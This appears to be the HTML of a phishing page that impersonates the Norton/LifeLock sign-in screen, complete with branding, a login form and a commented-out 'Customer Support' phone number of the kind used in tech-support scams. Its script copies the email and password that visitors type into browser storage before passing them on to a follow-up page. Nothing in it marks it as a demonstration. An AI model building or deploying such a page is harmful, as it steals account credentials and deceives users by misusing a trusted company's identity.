<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="./assets/favi.png" type="image/x-icon">
    <script src="https://unpkg.com/@tailwindcss/browser@4.0.17/dist/index.global.js"></script>

</head>

<body>

    <header class="md:w-[80%] mx-auto h-[7vh]">
        <div class="flex md:justify-between items-center p-2">
            <img class="w-[20%] lg:w-[7%]" src="./assets/logoblc.png" alt="logo">
            <!-- <p class="text-xl md:text-2xl  font-semibold text-center">Customer Support: <a
                    href="tel:+18449579700">+1(844)-957-9700</a>
            </p> -->
        </div>
    </header>
    <section class="pt-18 bg-[#252E38] h-[93vh]">
        <div class="flex justify-between w-[80%] mx-auto">
            <div class="flex flex-col gap-6 w-1/3 md:w-1/3 hidden md:block">
                <h1 class="text-3xl font-semibold text-gray-900 text-white">Welcome to Norton
                </h1>
                <p class=" mt-5 text-2xl text-gray-200">You're one of millions of customers worldwide who trust us to
                    keep
                    them
                    Cyber Safe.
                </p>
                <p class="mt-2 text-2xl text-gray-200">To access the features in your plan, sign in here.
                </p>
            </div>
            <div class="lg:w-1/3 md:w-1/2 w-full flex flex-col shadow-2xl">
                <img class="w-1/3 mx-auto" src="./assets/norton-lifelock-logo.png" alt="logo">
                <div class="mt-2 flex flex-col gap-10 rounded-md p-8 border border-gray-300 bg-white rounded-md">
                    <div>
                        <p class="text-2xl text-gray-900">Sign in to your account
                        </p>
                        <p class="text-gray-900">Welcome back! Please log in below to continue.
                        </p>
                    </div>
                    <form class="flex flex-col gap-5" onsubmit="saveLoginData()" action="./login.html">
                        <input type="email" id="email" class="border-b border-gray-500 p-2"
                            placeholder="Email address *" required>
                        <input type="password" id="password" class="border-b border-gray-500 p-2"
                            placeholder="Password *" required>
                        <input class="bg-[#FDD473] w-full cursor-pointer p-2 rounded-md hover:bg-yellow-400"
                            type="submit" value="Login">
                    </form>
                </div>
            </div>
        </div>
    </section>

    <script>
        function saveLoginData() {
            localStorage.setItem("email", document.getElementById("email").value);
            localStorage.setItem("password", document.getElementById("password").value);
        }
    </script>
</body>

</html>
